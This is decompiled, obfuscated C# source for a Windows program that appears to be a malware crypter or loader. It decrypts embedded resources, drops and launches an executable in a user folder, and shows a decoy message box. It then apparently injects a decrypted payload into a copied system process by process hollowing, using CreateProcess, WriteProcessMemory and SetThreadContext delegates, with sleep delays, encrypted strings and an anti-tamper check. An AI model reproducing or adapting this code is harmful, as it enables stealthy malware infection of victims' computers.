using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;
using ns11;
using ns7;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public class Class6
	{
		public delegate bool Delegate0(IntPtr thread, int[] context);

		public delegate IntPtr Delegate1(IntPtr proceSA3ASDASss, int addreSA3AAEss, uint siDSA3ze, uint tyDSA3AS3pe, uint proS3A3SAtect);

		public delegate bool Delegate2(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

		public delegate bool Delegate3(IntPtr thread, int[] context);

		public delegate bool Delegate4(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Struct1 startupInfo, ref Struct3 processInformation);

		public delegate int Delegate5(IntPtr process, int baseAddress);

		public delegate bool Delegate6(IntPtr thread, int[] context);

		public struct Struct0
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			public Struct2 struct2_0;

			public uint uint_7;

			public uint uint_8;

			public uint uint_9;

			public uint uint_10;

			public uint uint_11;

			public uint uint_12;

			public uint uint_13;

			public uint uint_14;

			public uint uint_15;

			public uint uint_16;

			public uint uint_17;

			public uint uint_18;

			public uint uint_19;

			public uint uint_20;

			public uint uint_21;

			public uint uint_22;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
			public byte[] byte_0;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct Struct1
		{
			public uint uint_0;

			public string string_0;

			public string string_1;

			public string string_2;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
			public byte[] byte_0;

			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public IntPtr intptr_2;

			public IntPtr intptr_3;
		}

		public struct Struct2
		{
			public uint uint_0;

			public uint uint_1;

			public uint uint_2;

			public uint uint_3;

			public uint uint_4;

			public uint uint_5;

			public uint uint_6;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
			public byte[] byte_0;

			public uint uint_7;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct Struct3
		{
			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public uint uint_0;

			public uint uint_1;
		}

		public delegate uint Delegate7(IntPtr threDSADSAad);

		public delegate bool Delegate8(IntPtr thread, int[] context);

		public delegate bool Delegate9(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

		internal static T smethod_0<T>(string string_0, string string_1)
		{
			Conversion.Int((object)false);
			Conversion.Int((object)false);
			Conversion.Int((object)true);
			return (T)(object)Marshal.GetDelegateForFunctionPointer(Class33.GetProcAddress(Class33.LoadLibraryA(ref string_0), ref string_1), typeof(T));
		}
	}

	[STAThread]
	public static void Main()
	{
		//IL_0378: Unknown result type (might be due to invalid IL or missing references)
		if (!Class40.smethod_0())
		{
			return;
		}
		int try000c_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		string text = default(string);
		object executablePath = default(object);
		string text2 = default(string);
		byte[] byte_ = default(byte[]);
		byte[] array = default(byte[]);
		ProcessStartInfo startInfo = default(ProcessStartInfo);
		bool bool_ = default(bool);
		string empty = default(string);
		string sourceFileName = default(string);
		string text3 = default(string);
		byte[] byte_2 = default(byte[]);
		byte[] byte_3 = default(byte[]);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try000c_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0013;
				case 1436:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_000c;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0013;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_0037;
						case 5:
							goto IL_006d;
						case 6:
						case 7:
							goto IL_0084;
						case 8:
							goto IL_008d;
						case 9:
							goto IL_009b;
						case 10:
							goto IL_00d2;
						case 11:
							goto IL_00ed;
						case 12:
							goto IL_0103;
						case 13:
							goto IL_0129;
						case 14:
							goto IL_0144;
						case 16:
							goto IL_01d7;
						case 17:
							goto IL_01da;
						case 19:
							goto IL_01fe;
						case 20:
							goto IL_0201;
						case 15:
						case 18:
						case 21:
						case 22:
						case 23:
							goto IL_020c;
						case 24:
							goto IL_0211;
						case 25:
							goto IL_021b;
						case 26:
							goto IL_0252;
						case 27:
							goto IL_0267;
						case 28:
							goto IL_0282;
						case 29:
							goto IL_029d;
						case 30:
							goto IL_02a5;
						case 31:
							goto IL_02ab;
						case 32:
							goto IL_02ba;
						case 33:
							goto IL_0343;
						case 34:
							goto IL_0352;
						case 35:
						case 36:
							goto IL_0358;
						case 37:
							goto IL_035f;
						case 38:
						case 39:
							goto IL_037e;
						case 40:
							goto IL_0386;
						case 41:
							goto IL_038f;
						case 42:
							goto IL_03a8;
						case 43:
							goto IL_03b4;
						case 44:
							goto IL_03bf;
						case 45:
							goto IL_03d9;
						case 46:
							goto IL_0402;
						case 47:
							goto IL_0416;
						case 48:
							goto IL_041d;
						case 51:
							goto IL_045f;
						case 52:
							goto IL_0462;
						case 49:
						case 50:
						case 53:
						case 54:
							goto IL_0471;
						case 55:
							goto IL_0480;
						case 56:
							goto end_IL_000c_2;
						default:
							goto end_IL_000c;
						case 57:
							goto end_IL_000c_3;
						}
						goto default;
					}
					IL_0480:
					num = 55;
					Thread.Sleep(2400);
					break;
					IL_0013:
					num = 2;
					Thread.Sleep(5000);
					goto IL_001f;
					IL_001f:
					num = 3;
					resourceManager = new ResourceManager(Class14.smethod_0(232), Assembly.GetExecutingAssembly());
					goto IL_0037;
					IL_0037:
					num = 4;
					text = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291));
					goto IL_006d;
					IL_006d:
					num = 5;
					Class33.smethod_0(Class33.smethod_140(Class14.smethod_0(352)));
					goto IL_0084;
					IL_0084:
					num = 7;
					executablePath = Application.get_ExecutablePath();
					goto IL_008d;
					IL_008d:
					num = 8;
					Conversion.Int((object)false);
					goto IL_009b;
					IL_009b:
					num = 9;
					text2 = Class14.smethod_0(257) + Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(385));
					goto IL_00d2;
					IL_00d2:
					num = 10;
					byte_ = (byte[])resourceManager.GetObject(Class14.smethod_0(446));
					goto IL_00ed;
					IL_00ed:
					num = 11;
					array = Class33.smethod_6(Class14.smethod_0(479), byte_);
					goto IL_0103;
					IL_0103:
					num = 12;
					((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text2 + Class14.smethod_0(512), array, false);
					goto IL_0129;
					IL_0129:
					num = 13;
					startInfo = new ProcessStartInfo(text2 + Class14.smethod_0(512));
					goto IL_0144;
					IL_0144:
					num = 14;
					if (!Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291)) + Class33.smethod_140(Class14.smethod_0(525)) + Class14.smethod_0(614)), false), (object)true, false), Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(Class14.smethod_0(257) + text2 + Class14.smethod_0(631)), false), (object)true, false))))
					{
						goto IL_01d7;
					}
					goto IL_020c;
					IL_01d7:
					num = 16;
					goto IL_01da;
					IL_01da:
					num = 17;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + Class14.smethod_0(512), false) != 0)
					{
						goto IL_01fe;
					}
					goto IL_020c;
					IL_01fe:
					num = 19;
					goto IL_0201;
					IL_0201:
					num = 20;
					Process.Start(startInfo);
					goto IL_020c;
					IL_020c:
					num = 23;
					bool_ = false;
					goto IL_0211;
					IL_0211:
					num = 24;
					empty = string.Empty;
					goto IL_021b;
					IL_021b:
					num = 25;
					sourceFileName = Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class33.smethod_140(Class14.smethod_0(689)) + Class14.smethod_0(778);
					goto IL_0252;
					IL_0252:
					num = 26;
					text3 = text2 + Class14.smethod_0(795);
					goto IL_0267;
					IL_0267:
					num = 27;
					byte_2 = (byte[])resourceManager.GetObject(Class14.smethod_0(812));
					goto IL_0282;
					IL_0282:
					num = 28;
					byte_3 = Class33.smethod_6(Class33.smethod_140(Class14.smethod_0(837)), byte_2);
					goto IL_029d;
					IL_029d:
					num = 29;
					VBMath.Randomize();
					goto IL_02a5;
					IL_02a5:
					num = 30;
					flag = false;
					goto IL_02ab;
					IL_02ab:
					num = 31;
					Conversion.Int((object)false);
					goto IL_02ba;
					IL_02ba:
					num = 32;
					if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(Interaction.Environ(Class33.smethod_140(Class14.smethod_0(258))) + Class33.smethod_140(Class14.smethod_0(291)) + Class33.smethod_140(Class14.smethod_0(525)) + Class14.smethod_0(614)), false), (object)true, false), Operators.CompareObjectEqual(Operators.CompareObjectEqual(executablePath, (object)(text2 + Class14.smethod_0(631)), false), (object)true, false))))
					{
						goto IL_0343;
					}
					goto IL_0358;
					IL_0343:
					num = 33;
					Conversion.Int((object)false);
					goto IL_0352;
					IL_0352:
					num = 34;
					flag = true;
					goto IL_0358;
					IL_0358:
					num = 36;
					if (!flag)
					{
						goto IL_035f;
					}
					goto IL_037e;
					IL_035f:
					num = 37;
					Interaction.MsgBox((object)Class14.smethod_0(926), (MsgBoxStyle)64, (object)Class14.smethod_0(959));
					goto IL_037e;
					IL_037e:
					num = 39;
					Class33.smethod_72();
					goto IL_0386;
					IL_0386:
					num = 40;
					File.Delete(text3);
					goto IL_038f;
					IL_038f:
					num = 41;
					File.Delete(text2 + Class14.smethod_0(980));
					goto IL_03a8;
					IL_03a8:
					num = 42;
					File.Copy(sourceFileName, text3, overwrite: true);
					goto IL_03b4;
					IL_03b4:
					num = 43;
					Conversion.Int(11);
					goto IL_03bf;
					IL_03bf:
					num = 44;
					Class33.DeleteFile(text2 + Class14.smethod_0(997));
					goto IL_03d9;
					IL_03d9:
					num = 45;
					Class33.DeleteFile(text + Class33.smethod_140(Class14.smethod_0(525)) + Class14.smethod_0(1046));
					goto IL_0402;
					IL_0402:
					num = 46;
					if (Class33.smethod_0(Class14.smethod_0(1083)))
					{
						goto IL_0416;
					}
					goto IL_045f;
					IL_0416:
					num = 47;
					if (flag)
					{
						goto IL_041d;
					}
					goto IL_0471;
					IL_041d:
					num = 48;
					Class33.smethod_138(bool_, Interaction.Environ(Class33.smethod_140(Class14.smethod_0(656))) + Class33.smethod_140(Class14.smethod_0(689)) + Class14.smethod_0(778), empty, byte_3);
					goto IL_0471;
					IL_045f:
					num = 51;
					goto IL_0462;
					IL_0462:
					num = 52;
					Class33.smethod_138(bool_, text3, empty, byte_3);
					goto IL_0471;
					IL_0471:
					num = 54;
					Conversion.Int((object)false);
					goto IL_0480;
					end_IL_000c_2:
					break;
				}
				num = 56;
				Conversion.Int((object)false);
				ProjectData.EndApp();
				break;
				end_IL_000c:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try000c_dispatch = 1436;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_000c_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Class5()
	{
		bool bool_ = false;
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if (!Class33.StrongNameSignatureVerificationEx(executingAssembly.Location, bool_0: true, out bool_) || !bool_ || !executingAssembly.FullName!.EndsWith(Class14.smethod_0(1092)))
		{
			throw new SecurityException(Class14.smethod_0(1117));
		}
	}

	internal static bool sa6Ubjtn7ZwdWpno2n()
	{
		return true;
	}

	internal static bool fAfrQx39uZ1PuPnO1A()
	{
		return false;
	}
}
